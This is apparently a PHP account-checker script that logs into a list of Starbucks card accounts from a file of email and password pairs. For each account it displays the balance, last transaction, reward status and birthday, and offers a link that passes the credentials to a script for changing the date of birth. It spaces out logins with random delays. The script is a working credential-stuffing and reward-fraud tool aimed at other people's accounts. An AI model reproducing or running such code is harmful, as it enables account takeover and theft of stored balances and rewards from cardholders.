<?php
require_once 'HTTP/Request2.php';
require_once 'functions.php';
require_once 'class.starbucks.php';

$http	= new HTTP_Request2();
$sb	= new Starbucks($http);
$list	= file_get_contents('cardlist.txt');
$count	= 0;

echo '<b>Please be patient as this page loads progressively as it polls the server at intervals</b>';
echo '<center><table width="100%" border="1" cellspacing="0">';
foreach(explode("\n", $list) as $carddata) {
	$count++;
	if (($count % 2) == 0) $bg = "#0EE"; else $bg = "#0FF";
	if ($carddata != '') {
		$data = explode(",", $carddata);
		$results = $sb->checkDetails(trim($data[0]), trim($data[1]));
		if ($results != false) {
			echo '<tr bgcolor="'.$bg.'">';
			echo '<td>#' . $count . '</td> ';
			echo '<td><img src="'.$results['cardphoto'].'"></td>';
			echo '<td>'.$data[0].'<br>('.$data[1].')<br>'.$data[2].'</td>';
			echo '<td>'.$results['cnmask'].'</td>';
			echo '<td>$'.$results['balance'].'</td>';
			echo '<td>'.$results['lasttx'].'</td>';
			echo '<td>'.$results['freedrink'].'<br>'.$results['freecake'].'</td>';
			echo '<td>'.$results['bd_year'].'-'.$results['bd_mth'].'-'.$results['bd_day'];
			echo '<br><input type="button" value="Change!" onclick="var mm = prompt(\'Month (01-12)?\',\''.(date('m')+1).'\'); window.location.href = \'changeDOB.php?mm=04&email='.urlencode(trim($data[0])).'&pw='.trim($data[1]).'\';">';
			echo '</td>';
			echo '</tr>';
		} else {
			echo '<tr bgcolor="'.$bg.'"><td>#'.$count.'</td><td colspan="7"><center>'.$data[0].' ('.trim($data[1]).') failed.</center></td></tr>';
		}
		ob_flush();
		flush();
		sleep(rand(1,3));
		$sb->logout($results['jcookie']);
	}
}
echo '</table></center>';
echo '<hr>Complete!';
?>
